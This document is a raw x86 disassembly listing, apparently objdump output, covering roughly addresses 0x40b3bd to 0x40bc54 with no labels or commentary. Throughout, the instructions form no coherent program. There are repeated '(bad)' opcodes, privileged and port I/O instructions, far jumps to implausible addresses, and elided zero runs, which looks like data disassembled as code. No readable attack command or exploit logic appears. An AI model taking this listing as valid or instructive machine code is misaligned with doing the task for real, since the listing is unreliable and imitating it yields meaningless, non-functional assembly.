  40b3bd:	rcl    DWORD PTR [ecx],1
  40b3bf:	cmp    esi,0xffffffb6
  40b3c2:	popa   
  40b3c3:	jo     0x40b3ad
  40b3c5:	shr    ecx,0x82
  40b3c8:	(bad)  
  40b3c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3ca:	inc    esi
  40b3cb:	jae    0x40b34f
  40b3cd:	sahf   
  40b3ce:	push   ecx
  40b3cf:	pop    ebp
  40b3d0:	add    cl,ah
  40b3d2:	stc    
  40b3d3:	add    al,0xe8
  40b3d5:	push   cs
  40b3d6:	je     0x40b3be
  40b3d8:	(bad)  
  40b3d9:	jo     0x40b396
  40b3db:	in     al,dx
  40b3dc:	mov    WORD PTR [edx+edx*2],fs
  40b3df:	xor    eax,0xe609fcff
  40b3e4:	je     0x40b3c3
  40b3e6:	push   ecx
  40b3e7:	scas   eax,DWORD PTR es:[edi]
  40b3e8:	push   ebx
  40b3e9:	jmp    0xd500ade7
  40b3ee:	test   eax,0xfe5944bd
  40b3f3:	add    al,0x0
  40b3f5:	jmp    0x134f432
  40b3fa:	mov    esp,0x29000001
  40b3ff:	add    DWORD PTR [edx+0x0],ebp
  40b402:	mov    ecx,0x4e006a08
  40b407:	inc    esi
  40b408:	hlt    
  40b409:	push   eax
	...
  40b41a:	add    BYTE PTR [eax],al
  40b41c:	sbb    al,0x56
  40b41e:	clc    
  40b41f:	inc    DWORD PTR [esi-0x108a0228]
  40b425:	ror    BYTE PTR [esi+0xb08e354],0xc0
  40b42c:	inc    edi
  40b42d:	or     ch,bl
  40b42f:	cmp    ch,BYTE PTR [ebx-0x68]
  40b432:	es inc ecx
  40b434:	mov    ds:0xfb1073ef,eax
  40b439:	xchg   esi,eax
  40b43a:	cmp    edi,0xffffff9c
  40b43d:	out    dx,eax
  40b43e:	jae    0x40b438
  40b440:	jecxz  0x40b402
  40b442:	inc    DWORD PTR [ebp+0x4587efac]
  40b448:	dec    edi
  40b449:	out    dx,eax
  40b44a:	jae    0x40b464
  40b44c:	mov    esp,0xc6ff1455
  40b451:	mov    esp,0xef5f75fd
  40b456:	jae    0x40b460
  40b458:	cmp    edx,DWORD PTR [ecx]
  40b45a:	(bad)  
  40b45b:	call   FWORD PTR [edi+ebp*8-0x4074138d]
  40b462:	jg     0x40b463
  40b464:	ins    BYTE PTR es:[edi],dx
  40b465:	out    dx,eax
  40b466:	inc    ebx
  40b467:	lock js 0x40b3f9
  40b46a:	std    
  40b46b:	jne    0x40b4ec
  40b46d:	sar    BYTE PTR [edx],0x54
  40b470:	push   ebx
  40b471:	or     bh,bh
  40b473:	jne    0x40b420
  40b475:	mov    edi,0xee9c81d8
  40b47a:	mov    edx,0x8b550827
	...
  40b490:	add    BYTE PTR [eax],al
  40b492:	scas   eax,DWORD PTR es:[edi]
  40b493:	mov    dl,al
  40b495:	hlt    
  40b496:	cli    
  40b497:	cmp    ebp,edx
  40b499:	(bad)  
  40b49a:	mov    al,ds:0x5245ced
  40b49f:	mov    eax,ds:0xa403e7fa
  40b4a4:	jmp    0xe6f138a7
  40b4a9:	(bad)  
  40b4aa:	neg    ebp
  40b4ac:	sub    DWORD PTR [ecx-0x6],eax
  40b4af:	in     eax,dx
  40b4b0:	add    al,BYTE PTR [eax]
  40b4b2:	cli    
  40b4b3:	jo     0x40b435
  40b4b5:	not    ah
  40b4b7:	cli    
  40b4b8:	jmp    0x42b170c
  40b4bd:	add    dl,bh
  40b4bf:	cmc    
  40b4c0:	jne    0x40b515
  40b4c2:	cli    
  40b4c3:	in     eax,dx
  40b4c4:	pop    edx
  40b4c5:	div    ch
  40b4c7:	lods   al,BYTE PTR ds:[esi]
  40b4c8:	add    ch,BYTE PTR [eax-0x64]
  40b4cb:	mov    dl,0x43
  40b4cd:	add    BYTE PTR [edx],dl
  40b4cf:	(bad)  
  40b4d0:	inc    edx
  40b4d1:	inc    ecx
  40b4d2:	cli    
  40b4d3:	ret    0x3f2e
  40b4d6:	jecxz  0x40b504
  40b4d8:	add    al,0xff
  40b4da:	pop    es
  40b4db:	out    0xda,al
  40b4dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4de:	test   dl,cl
  40b4e0:	call   0x4223394c
  40b4e5:	add    dl,ah
  40b4e7:	retf   
  40b4e8:	sub    BYTE PTR [ecx-0x6],al
  40b4eb:	inc    ebp
  40b4ec:	cld    
  40b4ed:	aas    
  40b4ee:	mov    ebx,0xfa025aed
  40b4f3:	in     eax,dx
  40b4f4:	cmp    dh,0x0
	...
  40b507:	add    bh,cl
  40b509:	in     eax,0xda
  40b50b:	mov    ecx,DWORD PTR [edx+edx*4-0x18]
  40b50f:	mov    WORD PTR [edi+0x62],?
  40b512:	jmp    0xc915:0xdbfd3dfe
  40b519:	in     eax,dx
  40b51a:	add    bh,bh
  40b51c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b51d:	jno    0x40b508
  40b51f:	je     0x40b513
  40b521:	add    al,0x51
  40b523:	rcr    DWORD PTR [edi+0x3bbb5de3],cl
  40b529:	or     cl,ch
  40b52b:	dec    esi
  40b52c:	xor    eax,0xe209c067
  40b532:	inc    ebp
  40b533:	jmp    0x1f13b9cb
  40b538:	cmc    
  40b539:	pop    eax
  40b53a:	loope  0x40b517
  40b53c:	imul   esp,DWORD PTR [ebx+0x2e],0xffffffe9
  40b540:	jb     0x40b58a
  40b542:	and    eax,0x9ded005e
  40b547:	jle    0x40b51d
  40b549:	loop   0x40b52c
  40b54b:	ret    
  40b54c:	dec    ecx
  40b54d:	sub    DWORD PTR [ecx-0x16bbfb0f],eax
  40b553:	push   ebx
  40b554:	sar    cl,cl
  40b556:	arpl   cx,bp
  40b558:	mov    ah,0x35
  40b55a:	add    DWORD PTR [ebx],0x5c2ef20a
  40b560:	loopne 0x40b5a6
  40b562:	sub    BYTE PTR [edx+ecx*2],al
  40b565:	loop   0x40b5ba
  40b567:	cld    
  40b568:	popf   
  40b569:	ror    DWORD PTR [ebx+0xe8],0x0
	...
  40b57c:	add    BYTE PTR [eax],al
  40b57e:	mov    ebp,gs
  40b580:	loopne 0x40b504
  40b582:	test   dl,ah
  40b584:	lods   eax,DWORD PTR ds:[esi]
  40b585:	dec    ch
  40b587:	and    DWORD PTR [eax],ebp
  40b589:	add    al,0xfb
  40b58b:	add    al,0xe9
  40b58d:	add    edi,DWORD PTR [edi-0x78]
  40b590:	mov    ch,0xe9
  40b592:	fs loop 0x40b5cd
  40b595:	pop    esp
  40b596:	test   BYTE PTR [ebx],0xe9
  40b599:	add    esp,DWORD PTR [edx-0x60]
  40b59c:	cmp    al,BYTE PTR [edx+edi*8]
  40b59f:	ins    BYTE PTR es:[edi],dx
  40b5a0:	xchg   edi,eax
  40b5a1:	sub    BYTE PTR [ebx-0x325eefc],bh
  40b5a7:	inc    ebx
  40b5a8:	jmp    0x85b808
  40b5ad:	sub    dh,dh
  40b5af:	loope  0x40b5e5
  40b5b1:	scas   al,BYTE PTR es:[edi]
  40b5b2:	add    BYTE PTR [eax+eax*1+0x66],al
  40b5b6:	mov    WORD PTR [eax+ebp*8],cs
  40b5b9:	pop    ebx
  40b5ba:	sbb    al,0xe3
  40b5bc:	inc    cl
  40b5be:	or     esp,DWORD PTR [ebx]
  40b5c0:	inc    ecx
  40b5c1:	jmp    0xa87fa867
  40b5c6:	stc    
  40b5c7:	ins    BYTE PTR es:[edi],dx
  40b5c8:	or     BYTE PTR [ecx-0x1497fac8],ch
  40b5ce:	stc    
  40b5cf:	add    al,0x80
  40b5d1:	cs push esp
  40b5d3:	or     eax,0xe2d43fe8
  40b5d8:	(bad)  
  40b5d9:	ins    BYTE PTR es:[edi],dx
  40b5da:	push   esp
  40b5db:	(bad)  
  40b5dd:	push   ss
  40b5de:	loop   0x40b631
  40b5e0:	call   0x40b66e
	...
  40b5f1:	add    BYTE PTR [eax],al
  40b5f3:	add    BYTE PTR [edi],ch
  40b5f5:	add    eax,0xe14c0600
  40b5fa:	(bad)  
  40b5fb:	je     0x40b5ae
  40b5fd:	jmp    0xe2e32d1c
  40b602:	enter  0xa52b,0xe1
  40b606:	push   ebx
  40b607:	jb     0x40b5cb
  40b609:	test   bl,al
  40b60b:	aad    0x9c
  40b60d:	loop   0x40b60d
  40b60f:	inc    ebx
  40b610:	imul   BYTE PTR [esi+0x26]
  40b613:	into   
  40b614:	or     ecx,DWORD PTR ds:0xe21385e8
  40b61a:	(bad)  
  40b61b:	jo     0x40b5d8
  40b61d:	loopne 0x40b5e5
  40b61f:	in     al,dx
  40b620:	sub    DWORD PTR [edx],esp
  40b622:	inc    ecx
  40b623:	jmp    0xe940bb21
  40b628:	loop   0x40b5b2
  40b62a:	neg    BYTE PTR [edi+0x14fe25d]
  40b630:	cli    
  40b631:	add    eax,DWORD PTR [eax]
  40b633:	jmp    0x92cd59
  40b638:	push   ebx
  40b639:	add    eax,0x47e35568
  40b63e:	add    BYTE PTR [eax-0x28],ch
  40b641:	dec    eax
  40b642:	inc    ecx
  40b643:	add    bl,bh
  40b645:	loopne 0x40b685
  40b647:	inc    ecx
  40b648:	adc    ebp,edx
  40b64a:	xor    edi,DWORD PTR [edi]
  40b64c:	jmp    0xe6dd:0x2eff0047
  40b653:	imul   esi,DWORD PTR [esi+0x68fde9],0x0
	...
  40b66a:	pop    esi
  40b66b:	inc    ebp
  40b66c:	inc    ecx
  40b66d:	add    bl,cl
  40b66f:	sbb    eax,DWORD PTR [eax+0x41]
  40b672:	jecxz  0x40b6b0
  40b674:	or     BYTE PTR [eax-0x6e],al
  40b677:	add    al,0x68
  40b679:	add    dl,bl
  40b67b:	add    al,0x80
  40b67d:	jmp    FWORD PTR [esi-0x24]
  40b680:	out    0x4f,al
  40b682:	out    0xe7,al
  40b684:	std    
  40b685:	lea    ebx,[esi-0x10]
  40b688:	cld    
  40b689:	push   esp
  40b68b:	cmp    al,ch
  40b68d:	fst    DWORD PTR [edx+0x2eff0004]
  40b693:	call   0xbcdc2c95
  40b698:	xchg   edx,eax
  40b699:	jge    0x40b62f
  40b69b:	out    0xc7,eax
  40b69d:	ret    0x49f
  40b6a0:	push   ebp
  40b6a1:	mov    esi,DWORD PTR [edi-0x4a0b3d77]
  40b6a7:	out    0xfd,eax
  40b6a9:	push   0xffffff93
  40b6ab:	ds daa 
  40b6ad:	jmp    FWORD PTR [esi]
  40b6af:	loope  0x40b697
  40b6b1:	xor    eax,0x89fde826
  40b6b6:	push   ds
  40b6b7:	in     eax,dx
  40b6b8:	lds    eax,FWORD PTR ds:0x412743
  40b6be:	arpl   WORD PTR [eax+eax*1],ax
  40b6c1:	add    dl,bh
  40b6c3:	push   0x8f44f680
  40b6c8:	in     eax,0x4f
  40b6ca:	shl    cl,cl
  40b6cc:	add    eax,DWORD PTR [eax]
	...
  40b6de:	add    BYTE PTR [eax],al
  40b6e0:	cli    
  40b6e1:	jne    0x40b678
  40b6e3:	push   eax
  40b6e4:	cli    
  40b6e5:	in     eax,dx
  40b6e6:	pop    edx
  40b6e7:	outs   dx,DWORD PTR ds:[esi]
  40b6e8:	mov    edx,0x9368042c
  40b6ed:	lods   eax,DWORD PTR ds:[esi]
  40b6ee:	inc    ebx
  40b6ef:	add    BYTE PTR [edx-0x5bebd2b],ah
  40b6f5:	xor    BYTE PTR ss:[edi],bh
  40b6f8:	shr    DWORD PTR [edx+eax*1-0x252a7801],cl
  40b6ff:	jecxz  0x40b6f7
  40b701:	push   ds
  40b702:	out    0x67,al
  40b704:	pop    ebp
  40b705:	scas   al,BYTE PTR es:[edi]
  40b706:	inc    ebx
  40b707:	add    BYTE PTR [edx-0x3b],dl
  40b70a:	inc    edx
  40b70b:	inc    ecx
  40b70c:	cli    
  40b70d:	jne    0x40b709
  40b70f:	aas    
  40b710:	cmp    ebp,esi
  40b712:	pop    edx
  40b713:	add    bh,dl
  40b715:	in     eax,dx
  40b716:	cmp    dh,0x4f
  40b719:	out    0xda,al
  40b71b:	(bad)  
  40b71c:	mov    esi,0x7f8ce606
  40b721:	(bad)  
  40b722:	jecxz  0x40b722
  40b724:	lods   eax,DWORD PTR ds:[esi]
  40b725:	jge    0x40b701
  40b727:	push   ecx
  40b728:	dec    ebx
  40b729:	out    dx,al
  40b72a:	add    bh,bh
  40b72c:	daa    
  40b72d:	jmp    0x7cf6:0xb60274e4
  40b734:	lea    esi,[esi-0x12013e46]
  40b73a:	dec    ebp
  40b73b:	mov    ecx,DWORD PTR [esi+0x74f3c06c]
  40b741:	sahf   
  40b742:	in     al,0x69
	...
  40b754:	add    BYTE PTR [eax],al
  40b756:	cli    
  40b757:	inc    ebx
  40b758:	sbb    al,0xff
  40b75a:	out    dx,eax
  40b75b:	in     eax,0xda
  40b75d:	lods   eax,DWORD PTR ds:[esi]
  40b75e:	fiadd  WORD PTR [esi+eiz*4]
  40b761:	in     eax,0x82
  40b763:	dec    ecx
  40b764:	popf   
  40b765:	mov    ebp,0x42d614f6
  40b76a:	cli    
  40b76b:	add    al,0xe9
  40b76d:	add    edi,edx
  40b76f:	xchg   ecx,eax
  40b770:	imul   ebp,ebp,0x37
  40b773:	fistp  QWORD PTR [ebp+0x54]
  40b776:	mov    ds:0xfa03e808,al
  40b77b:	in     al,dx
  40b77c:	rcl    BYTE PTR [edx-0x6],0x4
  40b780:	sar    DWORD PTR [ebp+edx*8+0x45],1
  40b784:	jmp    0xa88544e4
  40b789:	add    edx,DWORD PTR [edx-0x5bd56f4]
  40b78f:	(bad)  
  40b791:	and    al,0x23
  40b793:	inc    esp
  40b794:	jmp    0x414e1e7d
  40b799:	inc    edi
  40b79a:	out    0xde,al
  40b79c:	sub    eax,0xa845755c
  40b7a1:	add    esp,DWORD PTR [edx+0x5e]
  40b7a4:	test   eax,0xe16cfa42
  40b7a9:	inc    ebx
  40b7aa:	cmp    eax,DWORD PTR ds:0x4fa0181
  40b7b0:	imul   esp,ebp,0x43110d2e
  40b7b6:	scas   al,BYTE PTR es:[edi]
  40b7b7:	fdivrp st(5),st
  40b7b9:	jbe    0x40b7bb
	...
  40b7cb:	add    BYTE PTR [esi-0x2a],bh
  40b7ce:	out    dx,al
  40b7cf:	in     al,0x9c
  40b7d1:	xor    eax,0x545b8d1
  40b7d6:	jmp    0xd621bebf
  40b7db:	outs   dx,BYTE PTR ds:[esi]
  40b7dc:	repnz in al,dx
  40b7de:	data16 addr16 jge 0x40b7c0
  40b7e2:	scas   eax,DWORD PTR es:[edi]
  40b7e3:	sar    ecx,0x4
  40b7e6:	adc    al,0x79
  40b7e8:	popa   
  40b7e9:	cmp    bh,0xac
  40b7ec:	pop    ebp
  40b7ed:	ins    BYTE PTR es:[edi],dx
  40b7ee:	add    BYTE PTR [ebx+0x1],al
  40b7f1:	fidiv  WORD PTR [ecx+esi*8+0x31]
  40b7f5:	sub    al,0x7c
  40b7f7:	sahf   
  40b7f8:	push   esi
  40b7f9:	lea    eax,[ebp+edx*4-0x5d]
  40b7fd:	add    al,0x68
  40b7ff:	cmp    eax,0x110043b9
  40b804:	sbb    BYTE PTR [esi],0x41
  40b807:	jmp    0xc07fd122
  40b80c:	mov    eax,0x7879e804
  40b811:	(bad)  
  40b813:	repnz cmp DWORD PTR [edx+0x19],edx
  40b817:	mov    ecx,0x460004b1
  40b81c:	pop    edi
  40b81d:	mov    sp,0xb8a9
  40b821:	add    al,0x50
  40b823:	inc    esi
  40b824:	fs or  eax,0xde9a6ee8
  40b82a:	inc    BYTE PTR [ecx-0x6e]
  40b82d:	pop    edi
  40b82e:	jmp    FWORD PTR [esi]
	...
  40b840:	add    BYTE PTR [eax],al
  40b842:	inc    ebx
  40b843:	add    eax,0x44395a68
  40b848:	add    BYTE PTR [ecx-0x16bee27d],dl
  40b84e:	ficomp WORD PTR [eax]
  40b850:	aas    
  40b851:	sar    BYTE PTR [eax],0x5
  40b854:	call   0xff1f309e
  40b859:	repnz mov ecx,0x41991951
  40b85f:	add    eax,0x6556fe00
  40b864:	mov    esp,0x50053f29
  40b869:	fidiv  WORD PTR [ebx]
  40b86b:	or     eax,0xde5d32e8
  40b870:	inc    cl
  40b872:	jno    0x40b8d3
  40b874:	inc    DWORD PTR [eax]
  40b876:	cmp    al,0xe1
  40b878:	jae    0x40b876
  40b87a:	lods   al,BYTE PTR ds:[esi]
  40b87b:	cmp    ecx,DWORD PTR [eax]
  40b87d:	call   0x3ff62b
  40b882:	call   0xea8e:0x160002c6
  40b889:	adc    DWORD PTR [edi-0x6a8ab1c],0x8
  40b890:	push   0x2a
  40b892:	ins    BYTE PTR es:[edi],dx
  40b893:	cmp    ecx,DWORD PTR [eax]
  40b895:	call   0x3ff639
  40b89a:	stos   BYTE PTR es:[edi],al
  40b89b:	dec    ebx
  40b89c:	cld    
  40b89d:	push   0x13
  40b89f:	jmp    0xe1cd3b4b
  40b8a4:	or     eax,eax
	...
  40b8b6:	add    BYTE PTR [eax],al
  40b8b8:	aaa    
  40b8b9:	loopne 0x40b909
  40b8bb:	push   0xbeef0123
  40b8c0:	cmp    edx,eax
  40b8c2:	ds inc ecx
  40b8c4:	adc    edx,DWORD PTR [ecx]
  40b8c6:	push   DWORD PTR [ebp-0x15]
  40b8c9:	lock bt DWORD PTR [eax+ebp*8],ebp
  40b8ce:	out    0x3d,al
  40b8d0:	lods   eax,DWORD PTR ds:[esi]
  40b8d1:	out    0xfd,eax
  40b8d3:	mov    esp,esi
  40b8d5:	and    BYTE PTR [eax],ch
  40b8d7:	inc    ecx
  40b8d8:	jecxz  0x40b865
  40b8da:	cmp    ebx,DWORD PTR [ebx+ebp*4+0x41]
  40b8de:	add    BYTE PTR [eax+0x457408ac],al
  40b8e4:	jnp    0x40b884
  40b8e6:	ds inc ecx
  40b8e8:	mov    ds:0x93bde81f,eax
  40b8ed:	or     BYTE PTR [eax],al
  40b8ef:	or     edx,ebx
  40b8f1:	cmp    al,0x1f
  40b8f3:	push   esi
  40b8f4:	sti    
  40b8f5:	loopne 0x40b87c
  40b8f7:	call   FWORD PTR [eax+ebx*1-0x285cff98]
  40b8fe:	mov    esp,0x42a4fa68
  40b903:	inc    ecx
  40b904:	cli    
  40b905:	sbb    eax,0xb60274e3
  40b90a:	mov    ah,0xa1
  40b90c:	ins    DWORD PTR es:[edi],dx
  40b90d:	fwait
  40b90e:	jmp    0xfbea:0xe192e7fd
  40b915:	and    eax,DWORD PTR [ebp+edi*1+0x45ddf8fa]
	...
  40b92c:	add    BYTE PTR [eax],al
  40b92e:	dec    esi
  40b92f:	mov    edi,0x7345b8c2
  40b934:	loope  0x40b934
  40b936:	dec    eax
  40b937:	sbb    al,0x1b
  40b939:	pop    es
  40b93a:	scas   eax,DWORD PTR es:[edi]
  40b93b:	inc    esi
  40b93c:	loop   0x40b9b2
  40b93e:	cs pop ebx
  40b940:	pop    eax
  40b941:	or     BYTE PTR [edx],dl
  40b943:	clc    
  40b944:	pop    esi
  40b945:	call   FWORD PTR ds:0x38c9420b
  40b94b:	jmp    0xc386:0x4a815502
  40b952:	push   es
  40b953:	pushf  
  40b954:	cmp    DWORD PTR [edx-0x6],ebp
  40b957:	(bad)  
  40b958:	sub    eax,0xead66fff
  40b95d:	stc    
  40b95e:	jo     0x40b97b
  40b960:	loop   0x40b8ea
  40b962:	aas    
  40b963:	adc    cl,BYTE PTR [esi+0x45064234]
  40b969:	add    BYTE PTR [ecx+0x3b283ee0],al
  40b96f:	out    dx,al
  40b970:	cmp    BYTE PTR [esi],0xfa
  40b973:	jns    0x40b9bc
  40b975:	push   0x43add3
  40b97a:	dec    ebp
  40b97b:	mul    BYTE PTR [ecx]
  40b97d:	push   eax
  40b97e:	cli    
  40b97f:	in     eax,dx
  40b980:	or     eax,0x38b32ec0
  40b985:	call   0xff231ca2
  40b98a:	sub    al,BYTE PTR ds:0xebfa0451
  40b990:	sahf   
  40b991:	ins    BYTE PTR es:[edi],dx
	...
  40b9a2:	add    BYTE PTR [eax],al
  40b9a4:	mov    eax,ds:0x2a042844
  40b9a9:	fcom   QWORD PTR [ebx+0xc]
  40b9ac:	bound  esi,QWORD PTR [eax]
  40b9ae:	mov    esp,ecx
  40b9b0:	ins    BYTE PTR es:[edi],dx
  40b9b1:	in     al,dx
  40b9b2:	push   0xc1db655f
  40b9b7:	add    esi,DWORD PTR [esp+eax*4-0x2130fc12]
  40b9be:	cs loopne 0x40b9c9
  40b9c1:	lds    ebx,FWORD PTR [edi-0x1f]
  40b9c4:	inc    esp
  40b9c5:	fist   DWORD PTR [ebp-0x19e3702a]
  40b9cb:	push   esi
  40b9cc:	jno    0x40b9a9
  40b9ce:	sti    
  40b9cf:	fild   QWORD PTR [ecx+edx*2]
  40b9d2:	icebp  
  40b9d3:	jmp    0x40ba16
  40b9d5:	pop    esi
  40b9d6:	jbe    0x40b9b9
  40b9d8:	mov    esp,0xf9c6a03a
  40b9dd:	add    al,0xbc
  40b9df:	mov    WORD PTR [ecx],fs
  40b9e1:	xchg   DWORD PTR [eax+eiz*8],esp
  40b9e4:	xchg   ebx,eax
  40b9e5:	add    al,0xc3
  40b9e7:	das    
  40b9e8:	std    
  40b9e9:	push   eax
  40b9ea:	loope  0x40b9d7
  40b9ec:	ja     0x40ba4d
  40b9ee:	inc    esi
  40b9ef:	loope  0x40b973
  40b9f1:	inc    eax
  40b9f2:	cmp    eax,0xe96efa6e
  40b9f7:	imul   esp,ebx,0x45
  40b9fa:	test   al,0x3
  40b9fc:	bound  eax,QWORD PTR ds:0xed7a03e9
  40ba02:	mov    al,0x83
  40ba04:	(bad)  
  40ba05:	(bad)  
  40ba07:	ret    
	...
  40ba18:	add    BYTE PTR [eax],al
  40ba1a:	dec    ecx
  40ba1b:	cli    
  40ba1c:	mov    eax,0x583a4eb
  40ba21:	loope  0x40ba60
  40ba23:	ins    DWORD PTR es:[edi],dx
  40ba24:	jmp    0xffdc4f2c
  40ba29:	or     cl,0x1a
  40ba2c:	inc    ecx
  40ba2d:	jmp    0xf1b593fb
  40ba32:	mov    eax,ds:0x9adea0e5
  40ba37:	loop   0x40ba45
  40ba39:	push   esp
  40ba3a:	(bad)  
  40ba3d:	push   esp
  40ba3e:	pop    edx
  40ba3f:	(bad)  [ecx+esi*8+0x61]
  40ba43:	pop    edx
  40ba44:	jp     0x40ba04
  40ba46:	pop    edx
  40ba47:	int    0xc1
  40ba49:	in     eax,dx
  40ba4a:	stc    
  40ba4b:	das    
  40ba4c:	mov    edi,DWORD PTR [ebp+0x13fbc67e]
  40ba52:	imul   BYTE PTR [esi+0x2d]
  40ba55:	sahf   
  40ba56:	lods   al,BYTE PTR ds:[esi]
  40ba57:	or     al,0xe8
  40ba59:	int    0x9f
  40ba5b:	fsin   
  40ba5d:	pusha  
  40ba5e:	mov    esp,0xf9e967d8
  40ba63:	jmp    0x444dcc25
  40ba68:	inc    ecx
  40ba69:	jmp    0x2881fdff
  40ba6e:	(bad)  
  40ba6f:	fnstenv [ecx+esi*8+0x21]
  40ba73:	out    dx,al
  40ba74:	mov    al,ds:0x74db1a5e
  40ba79:	push   ebp
  40ba7a:	sbb    dl,BYTE PTR [ecx+0x8]
  40ba7d:	inc    ecx
	...
  40ba8e:	add    BYTE PTR [eax],al
  40ba90:	cmp    al,0x5f
  40ba92:	inc    DWORD PTR [esi-0x40]
  40ba95:	ret    
  40ba96:	add    ebp,ecx
  40ba98:	sub    al,0x8e
  40ba9a:	jmp    0x40bb06
  40ba9c:	mov    ch,0xdd
  40ba9e:	imul   ebp,ecx,0x9cff2b67
  40baa4:	add    ebp,ebp
  40baa6:	call   0x891b954b
  40baab:	lods   al,BYTE PTR ds:[esi]
  40baac:	popf   
  40baad:	popa   
  40baae:	add    cl,ch
  40bab0:	stos   BYTE PTR es:[edi],al
  40bab1:	xchg   edi,eax
  40bab2:	add    BYTE PTR [bx+0x46],ah
  40bab6:	inc    ecx
  40bab7:	add    BYTE PTR [ebx-0x6cbebe9a],cl
  40babd:	in     al,0x73
  40babf:	or     bl,bh
  40bac1:	jbe    0x40ba62
  40bac3:	call   DWORD PTR [eax+ebp*2+0x7ab40000]
  40baca:	push   di
  40bacc:	sar    BYTE PTR [edi],cl
  40bace:	add    BYTE PTR [eax-0x3e],ch
  40bad1:	aas    
  40bad2:	inc    ecx
  40bad3:	add    BYTE PTR [ebx+edi*1],dh
  40bad6:	or     al,ch
  40bad8:	fstp   DWORD PTR [edi+0x3ba4fffd]
  40bade:	cld    
  40badf:	dec    DWORD PTR [esi]
  40bae1:	or     eax,ebp
  40bae3:	repz sbb bh,BYTE PTR [edx+0xc91c9fd]
  40baea:	add    BYTE PTR [ebp-0x28],dl
  40baed:	aam    0x81
  40baef:	les    eax,FWORD PTR [edi+0x10538d]
	...
  40bb05:	add    BYTE PTR [eax-0x69ff972a],ch
  40bb0b:	dec    ebx
  40bb0c:	cld    
  40bb0d:	push   eax
  40bb0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb0f:	cmp    ecx,DWORD PTR [eax]
  40bb11:	push   0x23
  40bb13:	mov    edx,0x16941073
  40bb18:	sbb    al,0x85
  40bb1a:	sar    DWORD PTR [ebx],cl
  40bb1c:	daa    
  40bb1d:	mov    edi,DWORD PTR [esi]
  40bb1f:	mov    ecx,0x6ee36a8e
  40bb24:	add    BYTE PTR [eax+0x34],ch
  40bb27:	add    al,0x0
  40bb29:	add    BYTE PTR [esi+edi*1],ah
  40bb2c:	or     al,0x6a
  40bb2e:	and    al,0xb8
  40bb30:	jo     0x40bb36
  40bb32:	mov    ecx,0xeb006a04
  40bb37:	test   eax,0x54d3004b
  40bb3c:	(bad)  
  40bb3d:	jne    0x40bb39
  40bb3f:	icebp  
  40bb40:	jmp    0x40bba1
  40bb42:	inc    esp
  40bb43:	out    dx,al
  40bb44:	add    cl,cl
  40bb46:	mov    eax,0x715502d2
  40bb4b:	or     al,BYTE PTR [ebx+0x39639ec3]
  40bb51:	adc    al,0x81
  40bb53:	mov    esp,0x297f0068
  40bb58:	loopne 0x40bba9
  40bb5a:	test   DWORD PTR [ecx],esi
  40bb5c:	adc    bh,bh
  40bb5e:	pop    es
  40bb5f:	out    0x68,al
  40bb61:	add    BYTE PTR [ebp+0x31],dh
  40bb64:	clc    
  40bb65:	dec    al
  40bb67:	cmc    
  40bb68:	mov    BYTE PTR [edi+0x0],bh
	...
  40bb7a:	add    BYTE PTR [eax],al
  40bb7c:	out    dx,eax
  40bb7d:	dec    BYTE PTR [edx+0x693e5e54]
  40bb83:	add    al,ah
  40bb85:	in     eax,dx
  40bb86:	push   0xffffffff
  40bb88:	stc    
  40bb89:	in     eax,dx
  40bb8a:	add    bh,bh
  40bb8c:	iret   
  40bb8d:	(bad)  [eax-0x1]
  40bb90:	cmp    eax,0xfa6a07fc
  40bb95:	add    eax,DWORD PTR [eax+ebp*8]
  40bb98:	rcl    DWORD PTR [eax],1
  40bb9a:	add    al,0x0
  40bb9c:	mov    dl,BYTE PTR [edi+0x58]
  40bb9f:	cld    
  40bba0:	adc    bh,BYTE PTR [esp+ecx*2-0x3f5b0600]
  40bba7:	psubd  mm3,QWORD PTR [eax-0x4efa1477]
  40bbae:	or     bh,bh
  40bbb0:	xchg   ebp,edx
  40bbb2:	jmp    0x67fe:0xde477252
  40bbb9:	shr    dl,cl
  40bbbb:	xchg   edi,eax
  40bbbc:	aaa    
  40bbbd:	out    dx,al
  40bbbe:	add    dl,cl
  40bbc0:	fisubr DWORD PTR [edx-0x3d]
  40bbc3:	add    DWORD PTR [edx],ebp
  40bbc5:	daa    
  40bbc6:	pop    eax
  40bbc7:	or     al,0xcd
  40bbc9:	add    al,0x9c
  40bbcb:	sti    
  40bbcc:	fst    QWORD PTR [ecx+eiz*4-0x22]
  40bbd0:	mov    esp,0xb4f79bd7
  40bbd5:	push   ecx
  40bbd6:	stc    
  40bbd7:	fisub  WORD PTR [esi]
  40bbd9:	std    
  40bbda:	adc    BYTE PTR [ecx+0x22],ah
  40bbdd:	fdivr  st,st(5)
  40bbdf:	retf   
	...
  40bbf0:	add    BYTE PTR [eax],al
  40bbf2:	mov    ebx,0x8138e8f0
  40bbf7:	call   0xd84313e9
  40bbfc:	pop    ebx
  40bbfd:	cld    
  40bbfe:	popf   
  40bbff:	cli    
  40bc00:	pusha  
  40bc01:	fnstsw WORD PTR [edi+edx*8+0x5b]
  40bc05:	adc    BYTE PTR [edx-0x77],ah
  40bc08:	sbb    al,0x4
  40bc0a:	cli    
  40bc0b:	inc    esp
  40bc0c:	sbb    ebp,ebx
  40bc0e:	out    dx,al
  40bc0f:	or     BYTE PTR [esi-0xe12fda9],bh
  40bc15:	pop    ebx
  40bc16:	push   ebp
  40bc17:	xlat   BYTE PTR ds:[ebx]
  40bc18:	lods   eax,DWORD PTR ds:[esi]
  40bc19:	push   edi
  40bc1a:	out    0xd7,al
  40bc1c:	sbb    esi,esp
  40bc1e:	inc    esp
  40bc1f:	push   ecx
  40bc20:	add    esp,ebp
  40bc22:	push   cs
  40bc23:	pop    ebp
  40bc24:	xchg   esi,eax
  40bc25:	fld    QWORD PTR [edx-0x3e]
  40bc28:	hlt    
  40bc29:	add    eax,edi
  40bc2b:	mov    edx,DWORD PTR [ebx+eax*4-0x22864fc7]
  40bc32:	sbb    al,0xd7
  40bc34:	sti    
  40bc35:	sti    
  40bc36:	xchg   BYTE PTR [ecx-0x28f32018],al
  40bc3c:	mov    eax,0x510c8edc
  40bc41:	mov    esi,0xdd55d6ff
  40bc46:	outs   dx,BYTE PTR ds:[esi]
  40bc47:	std    
  40bc48:	pop    ebx
  40bc49:	xchg   ebp,ebp
  40bc4b:	into   
  40bc4c:	inc    ebp
  40bc4d:	fnsave ds:0xdd0fb3d6
  40bc53:	push   eax
  40bc54:	add    cl,ah
	...
